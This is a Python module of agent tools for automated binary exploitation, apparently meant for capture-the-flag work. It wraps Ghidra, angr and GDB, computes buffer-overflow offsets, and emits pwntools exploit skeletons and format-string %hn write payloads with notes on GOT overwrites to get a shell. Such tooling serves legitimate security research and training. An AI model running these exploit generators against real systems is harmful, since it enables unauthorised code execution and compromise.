"""
Deep Reverse Engineering Tools

Automated, headless binary analysis to support exploit development.
Integrates with Ghidra, Angr, GDB/pwndbg, and pwntools.

Tools:
  ghidra_headless_analyze  -- Ghidra headless decompilation with GHIDRA_HOME resolution
  angr_symbolic_exec       -- Actually EXECUTES angr symbolic execution (not just generates)
  gdb_pwndbg_command       -- Multi-command GDB with plugin autoload (pwndbg/gef/peda)
  find_bof_offset          -- Automated buffer overflow offset via De Bruijn cyclic pattern
  format_string_exploit    -- Build %n write-primitive payloads for format string bugs
"""

import os
import re
import shutil
import subprocess
import sys
import tempfile
import textwrap
from pathlib import Path
from src.sdk.tool import function_tool


# ─── Helpers ──────────────────────────────────────────────────────────────────

def _run(cmd: list, timeout: int = 60, stdin_data: str = "") -> tuple:
    try:
        r = subprocess.run(
            cmd, capture_output=True, text=True, timeout=timeout,
            input=stdin_data or None,
        )
        return r.returncode, r.stdout, r.stderr
    except subprocess.TimeoutExpired:
        return -1, "", f"TIMEOUT after {timeout}s"
    except FileNotFoundError:
        return -2, "", f"not found: {cmd[0]}"
    except Exception as e:
        return -3, "", str(e)


def _resolve_ghidra_home() -> str:
    """Resolve GHIDRA_HOME from env, common install paths, or PATH."""
    # 1. Environment variable
    env = os.environ.get("GHIDRA_HOME") or os.environ.get("GHIDRA_INSTALL_DIR")
    if env and Path(env).is_dir():
        return env
    # 2. Common install locations
    candidates = [
        "/opt/ghidra", "/usr/local/ghidra", "/usr/share/ghidra",
        str(Path.home() / "ghidra"), "/tools/ghidra",
    ]
    for cand in candidates:
        p = Path(cand)
        if p.is_dir() and any(p.rglob("analyzeHeadless")):
            return str(p)
    # 3. Look for analyzeHeadless in PATH
    ah = shutil.which("analyzeHeadless")
    if ah:
        return str(Path(ah).parent.parent)
    return ""


def _find_analyzeHeadless() -> str:
    """Return full path to analyzeHeadless script."""
    ghidra_home = _resolve_ghidra_home()
    if ghidra_home:
        for pattern in ["analyzeHeadless", "analyzeHeadless.bat", "support/analyzeHeadless"]:
            candidate = Path(ghidra_home) / pattern
            if candidate.exists():
                return str(candidate)
    ah = shutil.which("analyzeHeadless")
    return ah or ""


# ─────────────────────────────────────────────────────────────────────────────
# TOOL 1 — ghidra_headless_analyze (improved)
# ─────────────────────────────────────────────────────────────────────────────

@function_tool()
def ghidra_headless_analyze(binary_path: str, script_name: str = "AnalyzeAndExtract.java", args: str = "") -> str:
    """
    Run Ghidra headless analysis on a binary to extract decompiled C code
    and function offsets via a custom script.

    Automatically resolves GHIDRA_HOME from environment variables, common
    installation paths, and PATH. Use ghidra_decompile() for simpler use cases.

    Args:
        binary_path: Path to the target binary.
        script_name: The Ghidra script to execute (default: AnalyzeAndExtract.java).
        args: Optional space-separated arguments to pass to the script.

    Returns:
        Decompiled output or structured error with resolution hints.
    """
    p = Path(binary_path)
    if not p.exists():
        return f"Error: binary not found: {binary_path}"

    analyze_headless = _find_analyzeHeadless()
    if not analyze_headless:
        return (
            "Error: 'analyzeHeadless' not found.\n"
            "Fixes:\n"
            "  1. Set GHIDRA_HOME=/path/to/ghidra (env var)\n"
            "  2. Or ensure analyzeHeadless is in your PATH\n"
            "  3. Download Ghidra: https://ghidra-sre.org/\n"
            "Alternative: use ghidra_decompile() which also wraps Ghidra headless."
        )

    proj_dir = Path(tempfile.mkdtemp(prefix="ghidra_proj_"))
    cmd = [
        analyze_headless,
        str(proj_dir),
        "TempProject",
        "-import", binary_path,
        "-postScript", script_name,
        "-deleteProject",
    ]
    if args:
        cmd.extend(args.split())

    try:
        rc, out, err = _run(cmd, timeout=180)
        if rc == 0 or out.strip():
            lines = out.splitlines()
            header = (
                f"=== Ghidra Headless Analysis: {p.name} ===\n"
                f"Script: {script_name} | Lines: {len(lines)}\n"
            )
            body = out[:6000]
            suffix = "\n...[TRUNCATED — use read_tool_output for full output]" if len(out) > 6000 else ""
            return header + body + suffix
        return f"Error running Ghidra headless analysis:\n{err.strip()[:500]}"
    except Exception as e:
        return f"Error: {e}"
    finally:
        import shutil as _sh
        _sh.rmtree(str(proj_dir), ignore_errors=True)


# ─────────────────────────────────────────────────────────────────────────────
# TOOL 2 — angr_symbolic_exec (now ACTUALLY executes)
# ─────────────────────────────────────────────────────────────────────────────

@function_tool()
def angr_symbolic_exec(
    binary_path: str,
    target_address: str,
    avoid_addresses: str = "",
    mode: str = "run",
    use_veritesting: bool = False,
    timeout: int = 300,
) -> str:
    """
    Symbolically execute a binary with angr to find the input that reaches
    a target address (e.g., a 'win' function or 'success' branch).

    Now ACTUALLY EXECUTES the angr script in a subprocess (not just generates it).

    Args:
        binary_path: Path to the target binary.
        target_address: Hex address to reach (e.g., '0x401234').
        avoid_addresses: Comma-separated hex addresses to avoid (e.g., '0x401250,0x401290').
        mode: 'run' (execute, default) | 'script' (return script for manual use).
        use_veritesting: Enable Veritesting for better path explosion handling.
        timeout: Execution timeout in seconds (default 300).

    Returns:
        Found input payload, or the generated script in 'script' mode.
    """
    p = Path(binary_path)
    if not p.exists():
        return f"Error: binary not found: {binary_path}"

    try:
        target_addr = int(target_address, 16)
    except ValueError:
        return f"Error: invalid target address '{target_address}' — must be hex e.g. 0x401234"

    avoid_addrs = []
    if avoid_addresses.strip():
        try:
            avoid_addrs = [int(a.strip(), 16) for a in avoid_addresses.split(",") if a.strip()]
        except ValueError as e:
            return f"Error parsing avoid_addresses: {e}"

    veritesting_line = (
        "    sim.use_technique(angr.exploration_techniques.Veritesting())"
        if use_veritesting else ""
    )

    script = textwrap.dedent(f"""\
        import angr
        import sys
        import claripy

        BINARY = {binary_path!r}
        TARGET  = {hex(target_addr)}
        AVOID   = {[hex(a) for a in avoid_addrs]}

        project = angr.Project(BINARY, auto_load_libs=False)
        state = project.factory.entry_state(
            add_options={{angr.options.ZERO_FILL_UNCONSTRAINED_MEMORY,
                         angr.options.ZERO_FILL_UNCONSTRAINED_REGISTERS}}
        )
        sim = project.factory.simgr(state)
        {veritesting_line}

        print(f"[*] Starting symbolic execution — target: {{hex(TARGET)}}", flush=True)
        if AVOID:
            print(f"[*] Avoid addresses: {{[hex(a) for a in AVOID]}}", flush=True)

        sim.explore(find=TARGET, avoid=AVOID)

        if sim.found:
            sol = sim.found[0]
            stdin_payload = sol.posix.dumps(0)
            print(f"[+] SOLUTION FOUND!")
            print(f"[+] Stdin payload (raw): {{stdin_payload}}")
            print(f"[+] Stdin payload (hex): {{stdin_payload.hex()}}")
            try:
                print(f"[+] Stdin payload (text): {{stdin_payload.decode('utf-8', errors='replace')}}")
            except Exception:
                pass
        else:
            print("[-] No solution found.")
            print(f"[*] Deadended: {{len(sim.deadended)}}, Unsat: {{len(sim.unsat)}}")
            sys.exit(1)
    """)

    if mode == "script":
        return (
            f"## Angr Script (mode=script — manual execution)\n"
            f"Binary: {binary_path}\n"
            f"Target: {target_address}\n"
            f"Avoid: {avoid_addresses or 'none'}\n"
            f"Veritesting: {use_veritesting}\n\n"
            f"```python\n{script}\n```\n\n"
            f"Save and run: python3 solver.py"
        )

    # mode == 'run' — actually execute
    with tempfile.NamedTemporaryFile(mode="w", suffix=".py", prefix="angr_solver_",
                                     delete=False, encoding="utf-8") as tf:
        tf.write(script)
        script_path = tf.name

    try:
        rc, out, err = _run([sys.executable, script_path], timeout=timeout)
        combined = out + ("\n" + err if err.strip() else "")

        status = "✅ SUCCESS" if rc == 0 and "SOLUTION FOUND" in out else (
            "⏱ TIMEOUT" if rc == -1 else "❌ NO SOLUTION" if rc == 1 else f"❌ ERROR (rc={rc})"
        )

        result = [
            f"## Angr Symbolic Execution: {p.name}",
            f"Target  : {target_address}",
            f"Avoid   : {avoid_addresses or 'none'}",
            f"Verittest: {use_veritesting}",
            f"Timeout : {timeout}s",
            f"Status  : {status}",
            "",
            combined[:4000],
        ]

        if rc == -1:
            result.append(f"\n⏱ Timeout after {timeout}s — try:")
            result.append("  1. Add avoid_addresses to prune dead branches")
            result.append("  2. Set use_veritesting=True for better coverage")
            result.append("  3. Increase timeout")
            result.append(f"  4. Run script manually: python3 {script_path}")
        elif "SOLUTION FOUND" not in out:
            result.append("\n💡 No path found. Suggestions:")
            result.append("  1. Double-check target_address from ghidra_decompile()")
            result.append("  2. The binary may use stdin in unexpected ways — check with gdb_pwndbg_command()")
            result.append("  3. Try decompile_func() to identify the correct success basic block address")

        return "\n".join(result)
    finally:
        try:
            os.unlink(script_path)
        except Exception:
            pass


# ─────────────────────────────────────────────────────────────────────────────
# TOOL 3 — gdb_pwndbg_command (upgraded: multi-command + plugin autoload)
# ─────────────────────────────────────────────────────────────────────────────

@function_tool()
def gdb_pwndbg_command(
    binary_path: str,
    commands: str,
    plugin: str = "auto",
    args: str = "",
    timeout: int = 60,
) -> str:
    """
    Execute GDB commands headlessly on a binary with optional plugin support.

    Supports multiple semicolon-separated commands. Auto-detects and loads
    pwndbg, GEF, or PEDA if installed.

    Args:
        binary_path: Path to the target binary.
        commands: Semicolon-separated GDB commands to run.
                  Examples:
                    'checksec'
                    'info functions; disassemble main; info registers'
                    'break main; run; backtrace'
        plugin: Plugin to load: 'auto' (detect) | 'pwndbg' | 'gef' | 'peda' | 'none'
        args: Arguments to pass to the binary when running (e.g. 'AAAA').
        timeout: Timeout in seconds.

    Returns:
        Structured output for each command with plugin context.
    """
    p = Path(binary_path)
    if not p.exists():
        return f"Error: binary not found: {binary_path}"

    # --- Plugin resolution ---
    plugin_init_file = ""

    def _find_plugin_init(name: str) -> str:
        """Search common locations for plugin init scripts."""
        home = Path.home()
        search_paths = [
            home / f".{name}" / f"{name}.py",
            home / f".gdb-{name}" / f"{name}.py",
            Path(f"/opt/{name}/{name}.py"),
            Path(f"/usr/share/{name}/{name}.py"),
            Path(f"/usr/local/{name}/{name}.py"),
        ]
        # Also check gdbinit for source lines
        gdbinit = home / ".gdbinit"
        if gdbinit.exists():
            content = gdbinit.read_text(errors="ignore")
            for line in content.splitlines():
                line = line.strip()
                if line.startswith("source") and name in line.lower():
                    path_part = line.split(None, 1)[-1].strip()
                    if Path(path_part).exists():
                        return path_part
        for sp in search_paths:
            if sp.exists():
                return str(sp)
        return ""

    def _detect_plugin() -> tuple:
        """Returns (plugin_name, init_path)."""
        for name in ("pwndbg", "gef", "peda"):
            init = _find_plugin_init(name)
            if init:
                return name, init
        return "none", ""

    if plugin == "auto":
        detected_name, plugin_init_file = _detect_plugin()
        plugin = detected_name
    elif plugin != "none":
        plugin_init_file = _find_plugin_init(plugin)

    # --- Build GDB batch commands ---
    cmds = [c.strip() for c in commands.split(";") if c.strip()]
    gdb_cmd_args = []

    # Load plugin if found
    if plugin_init_file and plugin != "none":
        gdb_cmd_args += ["-ex", f"source {plugin_init_file}"]

    # Add each command
    for cmd in cmds:
        gdb_cmd_args += ["-ex", cmd]

    # Binary args
    full_cmd = ["gdb", "-q", "--batch"] + gdb_cmd_args
    if args:
        full_cmd += ["--args", binary_path] + args.split()
    else:
        full_cmd.append(binary_path)

    rc, out, err = _run(full_cmd, timeout=timeout)

    header = [
        f"## GDB Analysis: {p.name}",
        f"Plugin  : {plugin}{f' ({plugin_init_file})' if plugin_init_file else ' (not found)'}",
        f"Commands: {commands}",
        f"ExitCode: {rc}",
        "",
    ]

    if rc == -2:
        return "\n".join(header) + "\nError: 'gdb' not found. Install: apt install gdb"
    if rc == -1:
        return "\n".join(header) + f"\nError: GDB timed out after {timeout}s"

    output_lines = out.splitlines() if out else []
    err_lines = [l for l in (err or "").splitlines() if l.strip() and "No such" not in l]

    result = "\n".join(header)
    result += "\n### Output\n"
    result += "\n".join(output_lines[:200])
    if err_lines:
        result += "\n\n### Warnings/Errors\n" + "\n".join(err_lines[:20])

    return result


# ─────────────────────────────────────────────────────────────────────────────
# TOOL 4 — find_bof_offset (NEW)
# ─────────────────────────────────────────────────────────────────────────────

@function_tool()
def find_bof_offset(
    binary_path: str,
    max_length: int = 300,
    input_method: str = "stdin",
) -> str:
    """
    Find the exact buffer overflow offset using a De Bruijn cyclic pattern.

    Generates a non-repeating cyclic pattern, crashes the binary with it,
    and computes the exact offset from the faulting EIP/RIP/PC address.

    Args:
        binary_path: Path to the vulnerable binary (ELF/PE).
        max_length: Pattern length (default 300). Increase for larger buffers.
        input_method: 'stdin' | 'argv' — how to feed the pattern to the binary.

    Returns:
        Crash address, calculated offset, and a pwntools exploit skeleton.
    """
    p = Path(binary_path)
    if not p.exists():
        return f"Error: binary not found: {binary_path}"

    # Try pwntools approach first (most reliable)
    try:
        import importlib
        pwn = importlib.import_module("pwn")
        cyclic = getattr(pwn, "cyclic")
        cyclic_find = getattr(pwn, "cyclic_find")
        ELF = getattr(pwn, "ELF")

        pattern = cyclic(max_length)
        pattern_bytes = bytes(pattern)

        # Write pattern to temp file for stdin feeding
        with tempfile.NamedTemporaryFile(delete=False, suffix=".pat") as pat_f:
            pat_f.write(pattern_bytes)
            pat_path = pat_f.name

        # Run binary and capture crash
        env = os.environ.copy()
        env["ASAN_OPTIONS"] = "exitcode=42"

        if input_method == "argv":
            cmd = [binary_path, pattern_bytes.decode("latin-1", errors="replace")]
            rc, out, err = _run(cmd, timeout=15)
        else:  # stdin
            proc = subprocess.run(
                [binary_path],
                input=pattern_bytes,
                capture_output=True,
                timeout=15,
                env=env,
            )
            rc = proc.returncode
            out = proc.stdout.decode("utf-8", errors="replace")
            err = proc.stderr.decode("utf-8", errors="replace")

        os.unlink(pat_path)

        # Look for crash address in stderr/output
        combined = out + "\n" + err
        addr_matches = re.findall(
            r"(?:0x[0-9a-f]{4,16}|fault.{0,20}0x[0-9a-f]+|"
            r"RIP.{0,20}0x[0-9a-f]+|EIP.{0,20}0x[0-9a-f]+|"
            r"SIGSEGV.{0,50})",
            combined, re.IGNORECASE
        )

        # Run under GDB to get crash address reliably
        gdb_script = textwrap.dedent(f"""\
            set pagination off
            set logging off
            run < /dev/stdin
            bt
            info registers
            quit
        """)

        with tempfile.NamedTemporaryFile(mode="w", suffix=".gdb", delete=False) as gf:
            gf.write(gdb_script)
            gdb_script_path = gf.name

        gdb_proc = subprocess.run(
            ["gdb", "-q", "--batch", "-x", gdb_script_path, binary_path],
            input=pattern_bytes,
            capture_output=True,
            timeout=30,
        )
        gdb_out = gdb_proc.stdout.decode("utf-8", errors="replace")
        gdb_err = gdb_proc.stderr.decode("utf-8", errors="replace")
        os.unlink(gdb_script_path)

        all_output = gdb_out + "\n" + gdb_err

        # Extract crash registers
        crash_addr = None
        for reg in ("rip", "eip", "pc"):
            m = re.search(rf"{reg}\s+(?:=\s*)?0x([0-9a-f]+)", all_output, re.IGNORECASE)
            if m:
                crash_addr = int(m.group(1), 16)
                break

        if crash_addr:
            try:
                offset = cyclic_find(crash_addr)
                if offset == -1:
                    # Try little-endian bytes
                    offset = cyclic_find(crash_addr.to_bytes(8, "little")[:4])
            except Exception:
                offset = -1

            if offset >= 0:
                elf = ELF(binary_path, checksec=False)
                arch = "amd64" if elf.bits == 64 else "i386"

                skeleton = textwrap.dedent(f"""\
                    #!/usr/bin/env python3
                    from pwn import *

                    BINARY = {binary_path!r}
                    elf = ELF(BINARY)
                    context.binary = elf

                    OFFSET = {offset}   # verified offset to saved return address

                    def exploit():
                        payload = b'A' * OFFSET
                        # TODO: add your ROP chain / shellcode here
                        # payload += p64(elf.symbols['win'])   # ret2win
                        # payload += p64(ROP_GADGET)           # ret2libc
                        payload += b'B' * 8                    # overwrite saved RIP placeholder

                        if args.REMOTE:
                            io = remote('TARGET_IP', TARGET_PORT)
                        else:
                            io = process(BINARY)

                        io.sendlineafter(b':', payload)   # adjust recv trigger
                        io.interactive()

                    exploit()
                """)

                return "\n".join([
                    f"## BOF Offset: {p.name}",
                    f"Pattern length : {max_length}",
                    f"Crash address  : {hex(crash_addr)}",
                    f"Calculated offset: **{offset}**",
                    f"Architecture   : {arch} ({elf.bits}-bit)",
                    "",
                    "### pwntools exploit skeleton",
                    f"```python\n{skeleton}\n```",
                    "",
                    "[Next] generate_rop_chain(binary_path) — build ROP chain for NX bypass",
                    "       ghidra_decompile(binary_path) — confirm vulnerable function",
                ])
            else:
                return "\n".join([
                    f"## BOF Offset: {p.name}",
                    f"Crash address found: {hex(crash_addr)} but offset calculation failed.",
                    "This can happen if:",
                    "  - The crash address doesn't contain pattern bytes (indirect control flow)",
                    f"  - Pattern length ({max_length}) is too short — try max_length={max_length * 2}",
                    "  - The binary uses a non-standard calling convention",
                    "",
                    f"GDB output:\n{gdb_out[:1500]}",
                ])
        else:
            # No crash address found — show raw GDB output
            return "\n".join([
                f"## BOF Offset: {p.name}",
                "No crash address extracted from GDB output.",
                "Possible reasons:",
                "  - Binary did not crash (input too short — try max_length=1000)",
                "  - Binary uses argv not stdin — try input_method='argv'",
                "  - ASLR interfering — gdb disables ASLR by default but verify",
                "",
                f"GDB output:\n{all_output[:2000]}",
            ])

    except ImportError:
        pass  # pwntools not available, fall back to GDB pattern method

    # --- Fallback: GDB + De Bruijn pattern (no pwntools) ---
    # Generate a De Bruijn sequence manually
    def _debruijn(alphabet: bytes, n: int) -> bytes:
        """Generate a De Bruijn sequence B(alphabet, n)."""
        k = len(alphabet)
        a = [0] * k * n
        sequence = []

        def db(t: int, p: int):
            if t > n:
                if n % p == 0:
                    sequence.extend(a[1:p + 1])
            else:
                a[t] = a[t - p]
                db(t + 1, p)
                for j in range(a[t - p] + 1, k):
                    a[t] = j
                    db(t + 1, t)

        db(1, 1)
        return bytes(alphabet[i] for i in sequence)

    alphabet = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
    pattern = (_debruijn(alphabet, 4) * 4)[:max_length]

    with tempfile.NamedTemporaryFile(mode="wb", delete=False, suffix=".pat") as pf:
        pf.write(pattern)
        pat_path = pf.name

    gdb_cmd = textwrap.dedent(f"""\
        set pagination off
        run < {pat_path}
        info registers
        quit
    """)

    with tempfile.NamedTemporaryFile(mode="w", suffix=".gdb", delete=False) as gf:
        gf.write(gdb_cmd)
        gdb_path = gf.name

    rc, gout, gerr = _run(["gdb", "-q", "--batch", "-x", gdb_path, binary_path], timeout=30)
    os.unlink(pat_path)
    os.unlink(gdb_path)

    all_out = gout + "\n" + gerr
    m = re.search(r"(?:rip|eip|pc)\s+(?:=\s*)?0x([0-9a-fA-F]+)", all_out, re.IGNORECASE)
    crash_addr_str = m.group(1) if m else None

    out_lines = [
        f"## BOF Offset: {p.name} (fallback mode — install pwntools for best results)",
        f"Pattern: {max_length} bytes De Bruijn sequence",
    ]
    if crash_addr_str:
        # Find offset manually
        crash_bytes = bytes.fromhex(crash_addr_str.zfill(8))
        offset = pattern.find(crash_bytes[::-1])  # little-endian
        if offset == -1:
            offset = pattern.find(crash_bytes)
        out_lines.append(f"Crash at  : 0x{crash_addr_str}")
        out_lines.append(f"Offset    : {offset if offset != -1 else 'NOT FOUND (try larger pattern)'}")
        out_lines.append("\nInstall pwntools for reliable offset detection: pip install pwntools")
    else:
        out_lines.append("No crash address found in GDB output — binary may not crash with this input.")
        out_lines.append(f"\nGDB output:\n{all_out[:1500]}")

    return "\n".join(out_lines)


# ─────────────────────────────────────────────────────────────────────────────
# TOOL 5 — format_string_exploit (NEW)
# ─────────────────────────────────────────────────────────────────────────────

@function_tool()
def format_string_exploit(
    binary_path: str,
    target_addr: str,
    write_value: str,
    offset: int = 0,
) -> str:
    """
    Build a format string exploit payload to write an arbitrary value to a
    target address using %n write primitives.

    Useful for: GOT overwrite, ret2win via .fini_array, stack pointer hijack.

    Args:
        binary_path: Path to vulnerable binary (used to detect 32/64-bit).
        target_addr: Address to write to (hex, e.g. '0x601060' for GOT entry).
        write_value: Value to write (hex, e.g. '0xdeadbeef' or '0x401234').
        offset: Format string argument offset (which %N$... position corresponds
                to the start of your controlled buffer). 0 = auto-detect hint.

    Returns:
        Payload bytes (hex + Python repr), pwntools script, and exploitation guide.
    """
    p = Path(binary_path)
    if not p.exists():
        return f"Error: binary not found: {binary_path}"

    # Parse addresses
    try:
        t_addr = int(target_addr, 16)
        w_val = int(write_value, 16)
    except ValueError as e:
        return f"Error parsing addresses: {e}"

    # Detect architecture
    bits = 64  # default
    try:
        rc, fout, _ = _run(["file", binary_path], timeout=10)
        if "32-bit" in fout or "ELF32" in fout:
            bits = 32
        elif "64-bit" in fout or "ELF64" in fout:
            bits = 64
    except Exception:
        pass

    ptr_size = 8 if bits == 64 else 4
    pack_fmt = "<Q" if bits == 64 else "<I"

    # Try pwntools FmtStr for best accuracy
    pwntools_available = False
    try:
        import importlib
        pwn = importlib.import_module("pwn")
        pwntools_available = True
    except ImportError:
        pass

    if pwntools_available and offset > 0:
        pwntools_script = textwrap.dedent(f"""\
            #!/usr/bin/env python3
            from pwn import *

            BINARY = {binary_path!r}
            elf = ELF(BINARY)
            context.binary = elf

            TARGET_ADDR = {hex(t_addr)}   # address to overwrite
            WRITE_VALUE = {hex(w_val)}    # value to write there
            OFFSET      = {offset}        # %N$ format string offset

            def exec_fmt(payload):
                \"\"\"Send payload to binary and get response — adjust I/O as needed.\"\"\"
                io = process(BINARY)
                io.sendline(payload)
                output = io.recvall(timeout=1)
                io.close()
                return output

            autofmt = FmtStr(exec_fmt)
            # If offset is already known, use directly:
            writes = {{TARGET_ADDR: WRITE_VALUE}}
            payload = fmtstr_payload(OFFSET, writes, write_size='byte')

            print(f"[*] Payload length: {{len(payload)}} bytes")
            print(f"[*] Payload (hex): {{payload.hex()}}")
            print(f"[*] Payload (repr): {{payload}}")

            io = process(BINARY)
            io.sendline(payload)
            io.interactive()
        """)
    else:
        pwntools_script = "# Install pwntools for automated FmtStr payload: pip install pwntools\n"
        if offset == 0:
            pwntools_script += "# Then set offset= to your format string argument number\n"

    # Manual payload construction (short-write technique, 2-byte writes)
    # Split write_value into 2-byte shorts for %hn writes (more reliable)
    lo_word = w_val & 0xFFFF
    hi_word = (w_val >> 16) & 0xFFFF
    # For 64-bit full overwrite we may need 4 shorts
    word2 = (w_val >> 32) & 0xFFFF if bits == 64 else None
    word3 = (w_val >> 48) & 0xFFFF if bits == 64 else None

    def _addr_bytes(addr: int) -> bytes:
        import struct
        return struct.pack(pack_fmt, addr)

    # Build a minimal demonstration payload
    addr_bytes_lo = _addr_bytes(t_addr)
    addr_bytes_hi = _addr_bytes(t_addr + 2)
    demonstration_note = (
        f"  Write  {hex(w_val)} to {hex(t_addr)}\n"
        f"  Low word  (0x{lo_word:04x}) via %{lo_word}c%{offset}$hn  → {hex(t_addr)}\n"
        f"  High word (0x{hi_word:04x}) via %{max(1,hi_word - lo_word)}c%{offset+1}$hn → {hex(t_addr+2)}"
        if offset > 0 else "  Set offset= to generate specific payload"
    )

    result = [
        f"## Format String Exploit: {p.name}",
        f"Architecture : {bits}-bit",
        f"Target addr  : {hex(t_addr)}",
        f"Write value  : {hex(w_val)}",
        f"Fmt offset   : {offset if offset > 0 else 'UNKNOWN — run: for i in range(1,50): send(f\"%{i}$p\")'}",
        "",
        "### Technique: Two-byte short writes (%hn)",
        demonstration_note,
        "",
        "### Step 1: Find your format string offset",
        "  Send: AAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p",
        "  Find position where '41414141' appears — that's your offset",
        "",
        "### Step 2: pwntools automated payload",
        f"```python\n{pwntools_script}\n```",
        "",
        "### Step 3: GDB verification command",
        f"  gdb_pwndbg_command('{binary_path}', 'break printf; run; x/wx {hex(t_addr)}')",
        "",
        "### Common GOT targets (run: objdump -R binary | grep -E 'puts|printf|exit')",
        "  - puts@GOT → overwrite with system address → puts('/bin/sh') becomes shell",
        "  - exit@GOT → overwrite with main → infinite loop for leak re-use",
        "  - printf@GOT → overwrite with system → printf('/bin/sh') = shell",
    ]

    return "\n".join(result)


# ─────────────────────────────────────────────────────────────────────────────
# TOOL 6 — gdb_script_run (NEW)
# ─────────────────────────────────────────────────────────────────────────────

@function_tool()
def gdb_script_run(
    binary_path: str,
    gdb_script: str,
    stdin_data: str = "",
    stdin_file: str = "",
    timeout: int = 60,
    plugin: str = "auto",
) -> str:
    """
    Execute a full multi-line GDB script against a binary, with optional stdin.

    Unlike gdb_pwndbg_command() (which is limited to single-line -ex arguments),
    this tool writes an arbitrary multi-line GDB script to a temp file and runs
    it with --batch -x.  This enables:
      - commands ... end blocks for breakpoint automation
      - printf / x/Nbx register/memory dumps at specific addresses
      - Python GDB scripting blocks (python ... end)
      - Feeding stdin from a string or a file (needed to send flag candidates)

    Typical use case (iterative dynamic analysis of custom checkers):
        gdb_script_run(
            binary_path="/tmp/garble",
            gdb_script=\"\"\"
    set pagination off
    set logging off
    break *0x5fcae8
    commands
      silent
      printf "key: "
      x/8bx $rsp+0x16a
      printf "target: "
      x/8bx $rsp+0xa1
      quit
    end
    run
    \"\"\",
            stdin_data="ARENA{aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa}\\n",
            timeout=30,
        )

    Args:
        binary_path:  Path to the target binary.
        gdb_script:   Full multi-line GDB script text (commands, breakpoints,
                      printf, x/Nbx, python blocks, etc.).
        stdin_data:   String to pipe into the binary's stdin when it runs.
                      Use \\n as newline.  Mutually exclusive with stdin_file.
        stdin_file:   Path to a file whose content is piped as stdin.
                      Takes precedence over stdin_data if both are set.
        timeout:      Seconds before GDB is killed (default 60).
        plugin:       'auto' | 'pwndbg' | 'gef' | 'peda' | 'none'

    Returns:
        GDB output (stdout + stderr, capped at 8000 chars).
    """
    p = Path(binary_path)
    if not p.exists():
        return f"Error: binary not found: {binary_path}"

    # --- Plugin resolution (reuse logic from gdb_pwndbg_command) ---
    plugin_init_file = ""

    def _find_plugin_init(name: str) -> str:
        home = Path.home()
        search_paths = [
            home / f".{name}" / f"{name}.py",
            home / f".gdb-{name}" / f"{name}.py",
            Path(f"/opt/{name}/{name}.py"),
            Path(f"/usr/share/{name}/{name}.py"),
            Path(f"/usr/local/{name}/{name}.py"),
        ]
        gdbinit = home / ".gdbinit"
        if gdbinit.exists():
            content = gdbinit.read_text(errors="ignore")
            for line in content.splitlines():
                line = line.strip()
                if line.startswith("source") and name in line.lower():
                    path_part = line.split(None, 1)[-1].strip()
                    if Path(path_part).exists():
                        return path_part
        for sp in search_paths:
            if sp.exists():
                return str(sp)
        return ""

    if plugin == "auto":
        for name in ("pwndbg", "gef", "peda"):
            init = _find_plugin_init(name)
            if init:
                plugin_init_file = init
                plugin = name
                break
        else:
            plugin = "none"
    elif plugin != "none":
        plugin_init_file = _find_plugin_init(plugin)

    # --- Build final script (prepend plugin source if found) ---
    full_script_lines = []
    full_script_lines.append("set pagination off")
    full_script_lines.append("set logging off")
    if plugin_init_file and plugin != "none":
        full_script_lines.append(f"source {plugin_init_file}")
    full_script_lines.append(gdb_script.strip())

    full_script = "\n".join(full_script_lines) + "\n"

    # Write script to temp file
    with tempfile.NamedTemporaryFile(
        mode="w", suffix=".gdb", prefix="cyber_copilot_",
        delete=False, encoding="utf-8"
    ) as gf:
        gf.write(full_script)
        script_path = gf.name

    # Build stdin: file takes precedence, then string, then None
    stdin_bytes = None
    stdin_source_desc = "none"
    try:
        if stdin_file and os.path.exists(stdin_file):
            with open(stdin_file, "rb") as sf:
                stdin_bytes = sf.read()
            stdin_source_desc = f"file:{stdin_file}"
        elif stdin_data:
            # Replace literal \n escape sequences with real newlines
            stdin_bytes = stdin_data.replace("\\n", "\n").encode("utf-8", errors="replace")
            stdin_source_desc = f"string ({len(stdin_bytes)} bytes)"
    except Exception as e:
        return f"Error preparing stdin: {e}"

    cmd = ["gdb", "-q", "--batch", "-x", script_path, binary_path]

    header = [
        f"## GDB Script Run: {p.name}",
        f"Plugin  : {plugin}{f' ({plugin_init_file})' if plugin_init_file else ''}",
        f"Stdin   : {stdin_source_desc}",
        f"Timeout : {timeout}s",
        "",
        "### Script",
        "```",
        gdb_script.strip()[:1500] + ("..." if len(gdb_script) > 1500 else ""),
        "```",
        "",
    ]

    try:
        proc = subprocess.run(
            cmd,
            input=stdin_bytes,
            capture_output=True,
            timeout=timeout,
        )
        stdout = proc.stdout.decode("utf-8", errors="replace")
        stderr = proc.stderr.decode("utf-8", errors="replace")

        # Filter noisy GDB startup lines from stderr
        filtered_err = [
            l for l in stderr.splitlines()
            if l.strip()
            and not l.startswith("Reading symbols")
            and "No debugging symbols" not in l
            and "(No debugging" not in l
        ]

        result = "\n".join(header)
        result += "### Output\n"
        result += stdout[:6000]
        if filtered_err:
            result += "\n\n### Warnings/Errors\n" + "\n".join(filtered_err[:20])

        if proc.returncode == -15:
            result += f"\n\n⏱ GDB was killed (timeout after {timeout}s)"

        # Cap total output
        if len(result) > 8000:
            result = result[:7900] + "\n...[TRUNCATED]"
        return result

    except subprocess.TimeoutExpired:
        return "\n".join(header) + f"\n❌ GDB timed out after {timeout}s\nTry: increase timeout or simplify script"
    except FileNotFoundError:
        return "\n".join(header) + "\n❌ GDB not found. Install: apt install gdb"
    except Exception as e:
        return "\n".join(header) + f"\n❌ Error: {e}"
    finally:
        try:
            os.unlink(script_path)
        except Exception:
            pass
